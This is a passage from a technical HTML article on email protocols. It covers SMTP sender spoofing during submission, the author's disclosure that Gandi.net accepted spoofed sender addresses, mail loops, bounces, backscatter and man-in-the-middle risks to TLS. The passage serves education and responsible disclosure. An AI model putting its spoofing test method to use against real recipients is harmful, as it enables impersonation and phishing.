  <p>Can you <a href="https://en.wikipedia.org/wiki/Email_spoofing">spoof the sender address</a>
not only during relay but also during submission?
Or more precisely: Can you authenticate to an outgoing mail server as one user
but then use the address of a different user in the <code>MAIL</code> <code>FROM</code> and <code>From</code> fields?
According to <a href="https://datatracker.ietf.org/doc/html/rfc6409#section-6.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6409</a>,
outgoing mail servers may enforce submission rights, but they don’t have to.
If you want to know how your mailbox provider handles such submissions, you have to try it.
Some mail clients, such as <a href="https://support.mozilla.org/en-US/kb/using-identities">Thunderbird</a>
and <a href="https://docs.roundcube.net/doc/help/0.9/en_US/settings/identities.html">Roundcube</a>,
support so-called alternative sender identities to spoof the sender address for you.
If you want to do this manually in order to see the response from the server,
you can change the <code>From</code> address in the <a href="#esmtp-tool">above tool</a>
after you have already copied the <code>AUTH</code> command to your command-line interface.
Gmail, for example, accepts submissions with the address of a different user in the <code>MAIL</code> <code>FROM</code> and <code>From</code> fields
but then replaces both with the address of the authenticated user
and adds the spoofed sender address in an <code>X-Google-Original-From</code> header field.
Mail server software, such as <a href="https://en.wikipedia.org/wiki/Postfix_(software)">Postfix</a>,
needs to be <a href="http://www.postfix.org/SASL_README.html#server_sasl_authz_envelope">configured</a>
to reject submissions where the sender address doesn’t match the authentication address.
Postfix also has an <a href="http://www.postfix.org/postconf.5.html#smtpd_sasl_authenticated_header">option</a>
to add the authenticated sender to the <a href="#trace-information"><code>Received</code> header field</a>.
I think outgoing mail servers should reject spoofed sender addresses even if there is legitimate use.</p>

  <p>I reported to <a href="https://www.gandi.net/en-US/domain/email">Gandi.net</a> on 27 October 2020
that their outgoing mail server accepts submissions with spoofed <code>MAIL</code> <code>FROM</code> and <code>From</code> addresses.
On the one hand, they told me that some of their customers use alternative sender identities
and that they won’t enforce any rules for them.
On the other hand, they let me know that they would address the issue
before my <a href="https://www.google.ch/about/appsecurity/">90-day disclosure deadline</a>.
When I tested this again before publishing this article,
I got the impression that more of my test messages were rejected
by <a href="https://docs.gandi.net/en/gandimail/faq/error_types/rule3_2.html">their spam filter</a>,
but I could still authenticate myself as a Gandi user
and then use my Gmail address in the <code>MAIL</code> <code>FROM</code> and <code>From</code> fields.
This allows an attacker to abuse the <a href="#reputation">reputation</a> of Gandi’s mail server at least for targeted attacks.</p>

</details>

<details>
  <summary id="tool-limitations">
Limitations of the above tool
</summary>

  <ul>
    <li>The <a href="https://en.wikipedia.org/wiki/Example.com">example domains</a> don’t work,
you have to replace all example addresses before executing the generated commands.</li>
    <li>The tool supports only the complete removal of <code>Bcc</code> recipients
or <a href="#bcc-removal">grouped delivery</a> but no individual delivery.</li>
    <li>The tool supports only the <code>PLAIN</code>, <code>LOGIN</code>, and <code>CRAM-MD5</code> <a href="#user-authentication">user authentication</a> mechanisms.</li>
    <li>The tool doesn’t enforce <a href="#line-length-limit">line-length limits</a>.
Break lines longer than 1000 bytes yourself.</li>
    <li>The tool doesn’t support any <a href="#common-smtp-extensions">extensions</a> except <code>STARTTLS</code>, <code>AUTH</code>, and <code>PIPELINING</code>.</li>
    <li>The address format is more restrictive than necessary:
      <ul>
        <li>No <a href="#address-syntax">quoted strings</a> in the local part,</li>
        <li>No support for the <a href="#group-construct">group construct</a>,</li>
        <li>No support for <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.2.2">folding whitespace and comments</a>,</li>
        <li>Only <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters supported in addresses and <a href="#display-name">display names</a></li>
      </ul>
    </li>
  </ul>

</details>

<details>
  <summary id="other-smtp-commands">
Other <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> commands
</summary>

  <p>Besides <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.1"><code>EHLO</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.2"><code>MAIL</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.3"><code>RCPT</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.4"><code>DATA</code></a>,
and <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.10"><code>QUIT</code></a>,
there are some other <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> commands, which are rarely used in practice:</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Command</th>
          <th>Argument</th>
          <th>Description</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.5"><code>RSET</code></a></td>
          <td>–</td>
          <td>Reset already transmitted sender, recipient, and mail data.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.6"><code>VRFY</code></a></td>
          <td>Mailbox</td>
          <td>Verify whether the given mailbox exists on the server.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.7"><code>EXPN</code></a></td>
          <td>Mailing list</td>
          <td>Expand the given mailing list (i.e. return the members).</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.8"><code>HELP</code></a></td>
          <td>[Command]</td>
          <td>Ask for helpful information about the optional command.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.9"><code>NOOP</code></a></td>
          <td>–</td>
          <td><a href="https://en.wikipedia.org/wiki/NOP_(code)#NOP_protocol_commands">Do nothing</a> besides <a href="https://en.wikipedia.org/wiki/Keepalive">keeping the connection alive</a>.</td>
        </tr>
      </tbody>
    </table>

    <figcaption>

These commands can be used <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.4">at any time during a session</a>.
<code>VRFY</code> and <code>EXPN</code> are usually disabled for <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-7.3">security reasons</a>.

</figcaption>
  </figure>

  <p>Let’s look at two examples:</p>

  <figure>
    
    <figcaption>

What a response to the <code>VRFY</code> command usually looks like.
(The reply code of a disabled <code>VRFY</code> command <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-7.3">should be 252</a>, though.)

</figcaption>
  </figure>

  <figure>
    
    <figcaption>

How Gmail responds to the <code>HELP</code> command. 😄

</figcaption>
  </figure>

</details>

<h5 id="automatic-responses">Automatic responses</h5>

<p>In certain configurations, mail servers send a message in response to an incoming message,
which leads to the following problems.</p>

<details>
  <summary id="mail-loops">
Mail loops
</summary>

  <p>If a received message causes a mail server to send one or several messages
which in turn trigger further messages,
we end up with a <a href="https://en.wikipedia.org/wiki/Chain_reaction">chain reaction</a>.
In the case of email, chain reactions get out of control
if messages are <a href="https://en.wikipedia.org/wiki/Email_loop">sent in a loop</a>
or if the forwarding rules result in a <a href="https://en.wikipedia.org/wiki/Combinatorial_explosion">combinatorial explosion</a>.
Both of them can happen by accident
or as a <a href="https://en.wikipedia.org/wiki/Denial_of_service">denial-of-service attack</a> by an attacker.
Depending on the circumstances under which they happen,
chain reactions are prevented with the following measures:</p>
  <ul>
    <li><strong>Automatic responses</strong> are often sent to inform the sender
that a <a href="#bounce-messages">message could not be delivered</a>
or that the <a href="#out-of-office-replies">recipient won’t read the message</a> anytime soon.
Sometimes, automatic responses are used to <a href="#challenges">pose a challenge to the sender</a>
which needs to be completed in order for the message to be delivered.
The incoming mail server of the sender should not respond to such responses automatically
as this could result in messages being sent back and forth indefinitely between the two systems.
Automatic responses should always be sent to the <code>MAIL</code> <code>FROM</code> address,
which was specified in the <a href="#message-versus-envelope">envelope</a> of the message.
By using an <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.5.5">empty <code>MAIL</code> <code>FROM</code> address</a>
(<code>MAIL</code> <code>FROM:&lt;&gt;</code>), a sender can indicate that no automatic response shall be sent back.
Additionally, automatically submitted messages should be marked with the <code>Auto-Submitted</code> header field,
which is specified in <a href="https://datatracker.ietf.org/doc/html/rfc3834#section-5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3834</a>.
If an automatic process sends a message in response to another message,
the value of this header field should be set to <code>auto-replied</code>.
If the message is triggered by another event,
the value should be set to <code>auto-generated</code>.
If a message contains an <code>Auto-Submitted</code> header field with
<a href="https://www.iana.org/assignments/auto-submitted-keywords/auto-submitted-keywords.xhtml">a value other than <code>no</code></a>,
no automatic responses should be sent.
Furthermore, <a href="https://en.wikipedia.org/wiki/Microsoft_Exchange_Server">Microsoft Exchange Server</a>
introduced the custom header field <code>X-Auto-Response-Suppress</code>, allowing the sender to control
<a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcmail/ced68690-498a-4567-9d14-5c01f974d8b1">which types of automatic responses</a> shall be suppressed.</li>
    <li><strong>Email forwarding</strong> can cause loops as well.
If <code>alice@example.org</code> was an <a href="#alias-address">alias</a> for <code>alice@example.com</code> and vice versa,
emails would be forwarded in an <a href="https://en.wikipedia.org/wiki/Infinite_loop">infinite loop</a>.
Since only loops should be prevented but neither message forwarding nor automatic responses,
none of the previous techniques can be used.
Instead, incoming mail servers add a non-standardized header field, such as <code>Delivered-To</code> or <code>X-Loop</code>,
with the recipient’s address to messages before forwarding them.
When incoming mail servers receive a message,
they can simply go through its header fields to determine
whether the message has already been delivered to the specified mailbox.
If the message has already been delivered, they respond with a delivery failure.
Another way to detect loops is to <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-6.3">count</a>
the <a href="#trace-information"><code>Received</code> header fields</a> in a message.
If they exceed a certain threshold, the message is <a href="#bounce-messages">bounced</a>.
Both techniques require that mail servers only add additional header fields without removing existing ones.</li>
    <li><strong>Mailing lists</strong> forward incoming messages to all subscribers of the <a href="#mailing-list">list</a>.
If two mailing lists are subscribed to one another,
if automatic responses are sent to the mailing list’s address,
or if a subscriber automatically forwards messages back to the mailing list,
a mailing list is involved in a mail loop.
Such a loop can be busted with the same techniques as before:
Mailing lists shouldn’t forward messages with a header field of <code>Auto-Submitted:</code> <code>auto-replied</code>
or <code>Delivered-To</code> followed by the address of the mailing list.
However, mailing lists pose an additional problem:
If mailing lists are subscribed to one another,
the number of combinations before a loop occurs
explodes with the number of involved mailing lists.
For example, if you’re subscribed to ten mailing lists which are all subscribed to one another,
a single message to one of them results in almost one million messages delivered to your inbox.
To prevent this, <a href="https://cr.yp.to/docs/mailabuse.html">mailing lists shouldn’t forward messages from other mailing lists</a>,
which can be detected with <a href="#one-click-unsubscribe"><code>List-*</code> header fields</a>, such as <code>List-Id</code> or <code>List-Unsubscribe</code>.</li>
  </ul>

</details>

<details>
  <summary id="bounce-messages">
Bounce messages
</summary>

  <p>When a mail server fails to deliver a message,
it should send a so-called <a href="https://en.wikipedia.org/wiki/Bounce_message">bounce message</a>
to the sender to notify them about the failed delivery.
Since bounce messages are automatic responses,
they must be sent to the <code>MAIL</code> <code>FROM</code> address of the <a href="#message-versus-envelope">envelope</a>.</p>

  <figure>
    <svg id="figure-bounce-message" data-name="bounce-message" width="310.72" height="165" viewBox="-1.25 -1.25 310.72 165" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <path d="M 102.428,142.75 A 51.058 80 0 0 1 51.37,62.75 L 51.369573,62.740013" marker-end="url(#arrow-blue)" stroke-dasharray="97"></path>
    <text text-anchor="start">
        <tspan x="72.78" y="109.203">3. Retrieve</tspan>
    </text>
    <line x1="205.168" y1="30.75" x2="103.99" y2="30.75" marker-end="url(#arrow-red)" stroke-dasharray="94"></line>
    <text text-anchor="middle">
        <tspan x="154.11" y="18.75">2. Report</tspan>
    </text>
    <path d="M 205.793,142.75 A 51.058 80 0 0 0 256.85,62.75 L 256.850381,62.74" marker-end="url(#arrow-green)" stroke-dasharray="97"></path>
    <text text-anchor="end">
        <tspan x="235.44" y="109.203">1. Submit</tspan>
    </text>
    <rect x="102.74" y="123" width="102.74" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="154.11" y="148.65"><tspan>Mail client</tspan></tspan>
    </text>
    <rect x="0" y="0" width="102.74" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="51.37" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="51.37" y="47.65"><tspan>mail server</tspan></tspan>
    </text>
    <rect x="205.48" y="0" width="102.74" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="256.85" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="256.85" y="47.65"><tspan>mail server</tspan></tspan>
    </text>

</svg>

    <figcaption>
How the user learns about a delivery failure.</figcaption>
  </figure>

  <p>Historically, bounce messages were in a format that could be interpreted only by a human sender.
However, many messages are sent by automated systems,
which should also be able to detect when a message couldn’t be delivered.
For example, <a href="https://en.wikipedia.org/wiki/List_of_mailing_list_software">mailing list software</a>
should be able to remove no longer valid addresses from the list automatically.
Two techniques address this issue:</p>
  <ul>
    <li><a href="https://en.wikipedia.org/wiki/Return_receipt"><strong>Machine-processable non-delivery reports (<abbr title="Non-Delivery Report">NDR</abbr>)</strong></a>:
<a href="https://datatracker.ietf.org/doc/html/rfc3464"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3464</a> specifies how <a href="#multipart-messages">multipart messages</a>
can be used to send so-called delivery status notifications (<abbr title="Delivery Status Notifications">DSN</abbr>) to the sender in a standardized way.
In short, the bounce message is marked with
<code>Content-Type: multipart/report; report-type=delivery-status; boundary=&#34;…&#34;</code>
and the machine-processable part is labeled with <code>Content-Type: message/delivery-status</code>.
The report contains <a href="https://datatracker.ietf.org/doc/html/rfc3464#section-2.2">message-specific</a>
and <a href="https://datatracker.ietf.org/doc/html/rfc3464#section-2.3">recipient-specific</a> fields,
which are separated by a blank line.
The <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> includes <a href="https://datatracker.ietf.org/doc/html/rfc3464#page-34">some examples</a>.
The advantage of this approach is that even mail clients can make use of the report.
Its disadvantage is that not everyone supports this format and even if everyone did,
the sender doesn’t learn for which recipient the message couldn’t be delivered
if it was forwarded by an <a href="#alias-address">alias address</a>.
Since non-delivery reports include the header fields of the original message,
this could be recovered from the <a href="#trace-information">trace information</a>.</li>
    <li><a href="https://en.wikipedia.org/wiki/Variable_envelope_return_path"><strong>Variable envelope return path (<abbr title="Variable Envelope Return Path">VERP</abbr>)</strong></a>:
Since the <code>MAIL</code> <code>FROM</code> address of the envelope can be <a href="#diverging-envelope-example">different</a>
from the <code>From</code> address of the message, it can encode the recipient’s address.
For example, when the mailing list server at <code>list@example.com</code> sends a message to <code>alice@example.org</code>,
it can choose the <code>MAIL</code> <code>FROM</code> address as <code>list-owner+alice=example.org@example.com</code>.
Since it has to be a valid address,
the <code>@</code> of the recipient’s address has to be replaced with something else, such as <code>=</code>.
As long as the mailing list software can access the automatic responses that were delivered to such addresses,
it can easily associate a response with the recipient who sent it.
The software needs to guess only whether the response denotes a failed delivery
or an <a href="#out-of-office-replies">out-of-office reply</a>.
It should remove addresses from the mailing list
only if messages to a particular recipient cannot be delivered over a period of several weeks.
If you <a href="#raw-message">look at</a> the <a href="#trace-information"><code>Return-Path</code> header field</a> of messages
sent by mailing list providers, such as <a href="https://en.wikipedia.org/wiki/Mailchimp">Mailchimp</a>,
you see an address which identifies you.
The good thing about <abbr title="Variable Envelope Return Path">VERP</abbr> is that it works very reliably.
On the downside, mail clients can make use of this technique only with <a href="#subaddressing">subaddressing</a>.
Since the syntax for this is specific to each mailbox provider if subaddressing is supported at all,
I’m not aware of any mail clients which use <abbr title="Variable Envelope Return Path">VERP</abbr> to enhance the user experience of delivery failures.
Moreover, <abbr title="Variable Envelope Return Path">VERP</abbr> requires that the message is transmitted separately for each recipient.
While a single message can be delivered to several recipients by using several <code>RCPT</code> <code>TO</code> commands,
the <code>MAIL</code> <code>FROM</code> command can be used only once for each message.
Finally, the delivery of messages can be delayed due to <a href="#graylisting">graylisting</a>
if the <code>MAIL</code> <code>FROM</code> address includes a value which is unique to each message.
Unique <code>MAIL</code> <code>FROM</code> addresses allow the mailing list software to identify
which particular message could not be delivered to a particular recipient.</li>
  </ul>

</details>

<details>
  <summary id="backscatter">
Backscatter
</summary>

  <p>Given how easy it is to <a href="#spoofing">spoof</a> the sender address,
it’s sometimes better not to send a <a href="#bounce-messages">bounce message</a>.
Otherwise, the owner of the forged address might receive a large number of unsolicited bounce messages.
Such collateral spam is called <a href="https://en.wikipedia.org/wiki/Backscatter_(email)">backscatter</a>.
In order to distinguish legitimate bounce messages from misdirected ones,
the outgoing mail server can authenticate the <a href="#field-terminology">bounce address</a> by extending it
with a <a href="#applications-of-cryptographic-hash-functions">hash-based message authentication code (<abbr title="Hash-based Message Authentication Code">HMAC</abbr>)</a>.
This allows the incoming mail server to reject bounce messages
which are addressed to a non-authenticated address.
The best-known proposal for how to do this is called
<a href="https://en.wikipedia.org/wiki/Bounce_Address_Tag_Validation">bounce address tag validation (<abbr title="Bounce Address Tag Validation">BATV</abbr>)</a>.
It is specified in <a href="https://datatracker.ietf.org/doc/html/draft-levine-smtp-batv-01">this draft</a>.
In order to prevent the authenticated bounce address from being abused,
the <a href="https://datatracker.ietf.org/doc/html/draft-levine-smtp-batv-01#section-4.1"><abbr title="Hash-based Message Authentication Code">HMAC</abbr> is calculated</a>
over the original <code>MAIL</code> <code>FROM</code> address and a <a href="https://en.wikipedia.org/wiki/Timestamp">timestamp</a>
of when the authenticated address expires.
The timestamp and some part of the <abbr title="Hash-based Message Authentication Code">HMAC</abbr> are prepended to the original <code>MAIL</code> <code>FROM</code> address
to form the authenticated bounce address.</p>

</details>

<h5 id="password-based-authentication-mechanisms">Password-based authentication mechanisms</h5>

<p>The following boxes focus on password-based authentication mechanisms,
which allow users to <a href="#user-authentication">authenticate themselves</a> to servers with only their username and password.
Due to the nature of the topic, some of the later <a href="https://evalapply.org/#information-boxes">information boxes</a> are fairly advanced.
If you’re not interested in cryptography,
you may want to <a href="#access-protocols">skip them</a>.</p>

<details>
  <summary id="dangerous-reliance-on-tls">
Dangerous reliance on <abbr title="Transport Layer Security">TLS</abbr>
</summary>

  <p>As we’ve seen <a href="#user-authentication">above</a>,
your password is usually sent to the outgoing mail server every time you submit a message.
Many people think that this is no problem because the password is transmitted over a secure channel.
The goal of this box is to convince you that this attitude is naive and dangerous.
In the remaining boxes of this subsection, I will explain how we could do much better.</p>

  <p>One of the most important principles in <a href="https://en.wikipedia.org/wiki/Information_security">information security</a>
is <a href="https://en.wikipedia.org/wiki/Defense_in_depth_(computing)">defense in depth</a>:
Critical systems should have several layers of protections
so that when one layer fails, another can stop the threat.
In risk analysis, this is sometimes referred to as the
<a href="https://en.wikipedia.org/wiki/Swiss_cheese_model">Swiss cheese model</a>.
There are three different ways in which
<a href="https://evalapply.org/internet/#transport-layer-security">Transport Layer Security (<abbr title="Transport Layer Security">TLS</abbr>)</a>
can fail to protect sensitive information:</p>

  <ul>
    <li><strong>Proxy server</strong>: <abbr title="Transport Layer Security">TLS</abbr> connections are often <a href="https://en.wikipedia.org/wiki/TLS_termination_proxy">terminated</a>
at a so-called <a href="https://en.wikipedia.org/wiki/Proxy_server">proxy server</a>,
which acts as an intermediary between the client and the actual server.
While such proxies are operated by the same company as the actual server,
the communication between the client and the server is no longer protected
between the proxy and the actual server in the company’s private network.
Running a <a href="https://en.wikipedia.org/wiki/Reverse_proxy">proxy which appears to the client as the actual server</a>
is useful for <a href="https://en.wikipedia.org/wiki/Load_balancing_(computing)">load balancing</a>
and for accelerating the cryptographic operations with
<a href="https://en.wikipedia.org/wiki/TLS_acceleration">special hardware</a>.
On the downside, an employee or an attacker who compromised the company’s network
potentially has access to the transmitted information, which is no longer protected by <abbr title="Transport Layer Security">TLS</abbr>.</li>
  </ul>

  <figure>
    <svg id="figure-man-in-the-middle-proxy-server" data-name="man-in-the-middle-proxy-server" width="436.206" height="42" viewBox="-1.25 -1.25 436.206 42" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="87.054" y1="34.75" x2="173.17" y2="34.75"></line>
    <line x1="87.054" y1="4.75" x2="173.17" y2="4.75"></line>
    <line x1="346.652" y1="24.75" x2="261.474" y2="24.75" marker-end="url(#arrow-red)" stroke-dasharray="78"></line>
    <line x1="260.536" y1="14.75" x2="345.715" y2="14.75" marker-end="url(#arrow-red)" stroke-dasharray="78"></line>
    <line x1="173.17" y1="24.75" x2="87.991" y2="24.75" marker-end="url(#arrow-green)" stroke-dasharray="78"></line>
    <line x1="87.054" y1="14.75" x2="172.232" y2="14.75" marker-end="url(#arrow-green)" stroke-dasharray="78"></line>
    <rect x="0" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="43.371" y="25.65"><tspan>Client</tspan></tspan>
    </text>
    <rect x="173.482" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="216.853" y="25.65"><tspan>Proxy</tspan></tspan>
    </text>
    <rect x="346.965" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="390.336" y="25.65"><tspan>Server</tspan></tspan>
    </text>

</svg>

    <figcaption>
While the communication between the client and the proxy is protected (indicated by the blue lines),
the communication between the proxy and the server is exposed in the company’s private network.
</figcaption>
  </figure>

  <ul>
    <li><strong>Wrong server</strong>: The user’s mail client might be misconfigured
to connect to a server controlled by the attacker.
Instead of communicating with the mailbox provider,
the client communicates with the attacker.
In order to avoid detection by not raising any suspicion,
the attacker may want to connect to the legitimate server themself
and relay all messages in both directions.
Both the client and the legitimate server have the impression
that they communicate with the other party over a secure channel
when in fact the attacker can read and modify the exchanged messages at will.
But why would the mail client be misconfigured?
On the one hand, the user might fall for a
<a href="https://en.wikipedia.org/wiki/Social_engineering_(security)">social engineering attack</a>.
While <a href="https://en.wikipedia.org/wiki/Phishing">phishing</a> is much easier when it comes to websites
because the user just has to click on a malicious link,
it’s also possible in the case of mail clients:
The user just has to follow malicious instructions.
On the other hand, the mail client might be attacked during <a href="#autoconfiguration">autoconfiguration</a>.
Possible attack vectors are spoofed <abbr title="Domain Name System">DNS</abbr> entries if the client doesn’t require <abbr title="Domain Name System Security Extensions">DNSSEC</abbr>,
or a compromised <a href="#configuration-database">configuration database</a>.
Even if the client checks the domain name with some heuristic,
the heuristic might be vulnerable to similar attacks,
especially in the case of <a href="#custom-domains">custom domains</a>.</li>
  </ul>

  <figure>
    <svg id="figure-man-in-the-middle-wrong-server" data-name="man-in-the-middle-wrong-server" width="436.206" height="42" viewBox="-1.25 -1.25 436.206 42" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="260.536" y1="34.75" x2="346.652" y2="34.75"></line>
    <line x1="260.536" y1="4.75" x2="346.652" y2="4.75"></line>
    <line x1="87.054" y1="34.75" x2="173.17" y2="34.75"></line>
    <line x1="87.054" y1="4.75" x2="173.17" y2="4.75"></line>
    <line x1="346.652" y1="24.75" x2="261.474" y2="24.75" marker-end="url(#arrow-green)" stroke-dasharray="78"></line>
    <line x1="260.536" y1="14.75" x2="345.715" y2="14.75" marker-end="url(#arrow-green)" stroke-dasharray="78"></line>
    <line x1="173.17" y1="24.75" x2="87.991" y2="24.75" marker-end="url(#arrow-green)" stroke-dasharray="78"></line>
    <line x1="87.054" y1="14.75" x2="172.232" y2="14.75" marker-end="url(#arrow-green)" stroke-dasharray="78"></line>
    <rect x="0" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="43.371" y="25.65"><tspan>Client</tspan></tspan>
    </text>
    <rect x="173.482" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="216.853" y="25.65"><tspan>Attacker</tspan></tspan>
    </text>
    <rect x="346.965" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="390.336" y="25.65"><tspan>Server</tspan></tspan>
    </text>

</svg>

    <figcaption>
The client is misconfigured and connects directly to the attacker,
who forwards all communication without raising any suspicion.
</figcaption>
  </figure>

  <ul>
    <li><strong>Compromised certification authority or compromised server key</strong>:
While the <a href="https://evalapply.org/internet/#public-key-infrastructure">public-key infrastructure</a>
worked as intended in the previous example
(the malicious server had a legitimate certificate for its domain name),
the current infrastructure is far from perfect.
Its biggest design flaw is that any vendor-approved
<a href="https://en.wikipedia.org/wiki/Certificate_authority">certification authority (<abbr title="Certification Authority">CA</abbr>)</a>
can issue certificates for any domain by default.
There have been <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack#Notable_instances">several attacks</a>
on the integrity of <abbr title="Transport Layer Security">TLS</abbr>, ranging from <a href="https://www.wired.com/2011/09/diginotar-bankruptcy/">compromised</a> and
<a href="https://security.googleblog.com/2013/12/further-improving-digital-certificate.html">misbehaving</a> certification
authorities to <a href="https://www.cnet.com/news/nsa-disguised-itself-as-google-to-spy-say-reports/">surveillance programs</a>
and <a href="https://en.wikipedia.org/wiki/Lavabit#Connection_to_Edward_Snowden">search warrants for private keys</a>.
In other words, <abbr title="Transport Layer Security">TLS</abbr> isn’t guaranteed to be secure,
but it’s still much better than having no protection at all, of course.
An illegitimately issued certificate allows the attacker
to intercept the communication between the client and the server.
As long as the client considers the certificate to be valid,
it will accept the certificate and start communicating with what it believes to be the intended server.
There have been several efforts to prevent certification authorities
from issuing certificates without the consent of the domain owner,
such as <a href="#http-public-key-pinning"><abbr title="HyperText Transfer Protocol">HTTP</abbr> Public-Key Pinning (<abbr title="HTTP Public-Key Pinning">HPKP</abbr>)</a>
and <a href="https://en.wikipedia.org/wiki/Certificate_Transparency">Certificate Transparency (<abbr title="Certificate Transparency">CT</abbr>)</a>.
We will discuss <a href="#dns-based-authentication-of-named-entities">another approach</a> in the last chapter of this article.
It’s important that these efforts don’t remain limited to the web
but that mail servers begin to require more secure certificates as well.
As I will explain to you in the following boxes,
we don’t even need better certificates to protect the communication between mail clients and mail servers,
simply using better authentication mechanisms would be enough.
And unlike the efforts at the <a href="https://evalapply.org/internet/#security-layer">security layer</a>,
which prevent only attacks with maliciously issued certificates,
better authentication mechanisms also prevent attacks with compromised server keys,
where an attacker has gained access to the server’s private key.
When I say that an organization or key is compromised,
I just mean that its behavior or use is different from what it should be according to standards and agreements.
Whether the integrity was lost due to an attack or due to deliberate actions by the owner doesn’t matter.
For a security analysis, it’s also irrelevant whether the perpetrator acts in good faith or in bad faith.
This article is not about the ethics of information security and
<a href="https://en.wikipedia.org/wiki/Backdoor_(computing)">government backdoors</a>.</li>
  </ul>

  <figure>
    <svg id="figure-man-in-the-middle-right-domain" data-name="man-in-the-middle-right-domain" width="436.206" height="42" viewBox="-1.25 -1.25 436.206 42" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="260.536" y1="34.75" x2="346.652" y2="34.75"></line>
    <line x1="260.536" y1="4.75" x2="346.652" y2="4.75"></line>
    <line x1="87.054" y1="34.75" x2="173.17" y2="34.75"></line>
    <line x1="87.054" y1="4.75" x2="173.17" y2="4.75"></line>
    <line x1="346.652" y1="24.75" x2="261.474" y2="24.75" marker-end="url(#arrow-green)" stroke-dasharray="78"></line>
    <line x1="260.536" y1="14.75" x2="345.715" y2="14.75" marker-end="url(#arrow-green)" stroke-dasharray="78"></line>
    <line x1="173.17" y1="24.75" x2="87.991" y2="24.75" marker-end="url(#arrow-green)" stroke-dasharray="78"></line>
    <line x1="87.054" y1="14.75" x2="172.232" y2="14.75" marker-end="url(#arrow-green)" stroke-dasharray="78"></line>
    <rect x="0" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="43.371" y="25.65"><tspan>Client</tspan></tspan>
    </text>
    <rect x="173.482" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="216.853" y="25.65"><tspan>Server</tspan></tspan>
    </text>
    <rect x="346.965" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="390.336" y="25.65"><tspan>Server</tspan></tspan>
    </text>

</svg>

    <figcaption>
The malicious server (in red) has the same name as the legitimate server (in green).
An attacker can impersonate the server by getting a certificate issued for their public key
or by gaining access to the private key of the server and using the original server certificate.
</figcaption>
  </figure>

  <p>In these scenarios, the attacker is a so-called
<a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle (<abbr title="Man-In-The-Middle">MITM</abbr>)</a>
in the conversation between the client and the server.</p>

</details>

<details>
  <summary id="cryptographic-hash-functions">
Cryptographic hash functions
</summary>

  <p>Before we can discuss better authentication mechanisms,
we have to cover <a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function">cryptographic hash functions</a> first.
A cryptographic hash function is an <a href="https://en.wikipedia.org/wiki/Algorithm">algorithm</a>,
which maps inputs of arbitrary size to outputs of fixed size deterministically and irreversibly:</p>

  <figure>
    <svg id="figure-hash-one-way" data-name="hash-one-way" width="279.867" height="64.75" viewBox="-1.25 -1.25 279.867 64.75" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="183.413" y1="36.75" x2="80.815" y2="36.75" marker-end="url(#arrow-red)" stroke-dasharray="96"></line>
    <text text-anchor="middle">
        <tspan x="131.645" y="60.25">Infeasible</tspan>
    </text>
    <line x1="79.878" y1="24.75" x2="182.476" y2="24.75" marker-end="url(#arrow-green)" stroke-dasharray="96"></line>
    <text text-anchor="middle">
        <tspan x="131.645" y="12.75">Efficient</tspan>
    </text>
    <rect x="0" y="0" width="79.565" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
